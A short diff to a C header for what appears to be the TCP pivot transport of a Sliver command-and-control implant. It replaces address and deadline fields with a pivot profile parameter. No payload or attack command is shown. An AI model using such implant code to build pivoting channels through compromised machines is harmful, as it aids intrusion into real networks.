@@ -1,15 +1,16 @@
 #pragma once
 
 typedef struct _SLIVER_TCP_CLIENT {
-	LPSTR lpBindAddress;
-	DWORD dwWriteDeadline;
-	DWORD dwReadDeadline;
+	PPIVOT_PROFILE pProfile;
 	SOCKET Sock;
 	PCRITICAL_SECTION pReadLock;
 	PCRITICAL_SECTION pWriteLock;
 } SLIVER_TCP_CLIENT, *PSLIVER_TCP_CLIENT;
 
-PSLIVER_TCP_CLIENT TcpInit();
+PSLIVER_TCP_CLIENT TcpInit
+(
+	_In_ PPIVOT_PROFILE pProfile
+);
 
 BOOL TcpCleanup
 (
